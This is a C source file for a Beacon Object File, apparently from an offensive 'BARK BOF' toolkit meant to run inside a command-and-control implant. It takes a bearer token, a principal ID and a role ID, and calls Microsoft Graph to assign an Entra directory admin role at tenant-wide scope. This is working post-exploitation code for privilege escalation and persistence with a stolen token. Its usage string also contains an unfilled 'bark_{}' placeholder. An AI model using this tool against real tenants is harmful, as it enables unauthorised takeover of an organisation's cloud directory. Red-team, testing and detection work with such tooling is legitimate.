/*
 * new_entra_role_assignment.c — BARK BOF
 * New-EntraRoleAssignment — Assign an Entra admin role to a principal
 *
 * Args : token, principalId, roleDefinitionId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[2048];
    static char bodyBuf[4096];
    LPWSTR widePath = NULL;
    char  *token = NULL;
    char  *principalId = NULL;
    char  *roleDefinitionId = NULL;
    BeaconDataParse(&parser, args, alen);
    token = BeaconDataExtract(&parser, NULL);
    principalId = BeaconDataExtract(&parser, NULL);
    roleDefinitionId = BeaconDataExtract(&parser, NULL);
    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_{}" "\n", "<token> <principalId> <roleDefinitionId>");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf), "{\"@odata.type\":\"#microsoft.graph.unifiedRoleAssignment\",""\"principalId\":\"%s\",\"roleDefinitionId\":\"%s\",""\"directoryScopeId\":\"/\"}", principalId, roleDefinitionId);
    MSVCRT$strcpy(pathBuf, "/v1.0/roleManagement/directory/roleAssignments");
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BarkPost(L"graph.microsoft.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
